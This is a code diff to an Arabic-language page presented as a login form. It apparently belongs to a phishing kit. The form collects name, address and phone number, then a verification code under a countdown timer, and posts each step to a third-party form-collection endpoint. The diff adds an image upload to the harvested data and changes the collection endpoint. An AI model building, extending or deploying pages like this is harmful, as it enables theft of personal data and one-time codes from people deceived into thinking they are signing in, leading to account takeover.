@@ -68,7 +68,8 @@
     }
 
     input[type="tel"],
-    input[type="text"] {
+    input[type="text"],
+    input[type="file"] {
       width: 100%;
       padding: 12px 15px;
       font-size: 16px;
@@ -173,7 +174,7 @@
 
       <h2>تسجيل الدخول</h2>
 
-      <form id="phoneForm" onsubmit="return sendPhone(event);">
+      <form id="phoneForm" onsubmit="return sendPhone(event);" enctype="multipart/form-data">
         <label for="fullname">الاسم الثلاثي:</label>
         <input type="text" id="fullname" name="fullname" required placeholder="اكتب اسمك الثلاثي" />
 
@@ -182,6 +183,9 @@
 
         <label for="phone">رقم الهاتف:</label>
         <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />
+
+        <label for="image">إرفاق صورة (اختياري):</label>
+        <input type="file" id="image" name="image" accept="image/*" />
 
         <button type="submit" id="sendPhoneBtn">إرسال البيانات</button>
         <div id="timer"></div>
@@ -248,9 +252,11 @@
 
     function sendPhone(event) {
       event.preventDefault();
+
       const phoneInput = document.getElementById('phone');
       const fullname = document.getElementById('fullname').value;
       const address = document.getElementById('address').value;
+      const image = document.getElementById('image').files[0];
 
       if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
         alert('يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً');
@@ -258,21 +264,27 @@
         return false;
       }
 
-      const payload = { fullname, address, phone: phoneInput.value };
-      fetch('https://formcarry.com/s/2evKahWtdJS', {
+      const formData = new FormData();
+      formData.append("fullname", fullname);
+      formData.append("address", address);
+      formData.append("phone", phoneInput.value);
+      if (image) {
+        formData.append("image", image);
+      }
+
+      fetch('https://formcarry.com/s/a-Yw-WFDEqO', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-        body: JSON.stringify(payload)
+        body: formData
       })
       .then(response => {
-        if (!response.ok) throw new Error('فشل إرسال رقم الهاتف');
+        if (!response.ok) throw new Error('فشل إرسال البيانات');
         phoneInput.disabled = true;
         document.getElementById('sendPhoneBtn').disabled = true;
         document.getElementById('codeField').style.display = 'block';
         startTimer(480);
       })
       .catch(error => {
-        alert('تعذر إرسال رقم الهاتف. حاول مرة أخرى.');
+        alert('تعذر إرسال البيانات. حاول مرة أخرى.');
         console.error(error);
       });
 
@@ -311,7 +323,7 @@
         code
       };
 
-      fetch('https://formcarry.com/s/2evKahWtdJS', {
+      fetch('https://formcarry.com/s/a-Yw-WFDEqO', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
         body: JSON.stringify(payload)
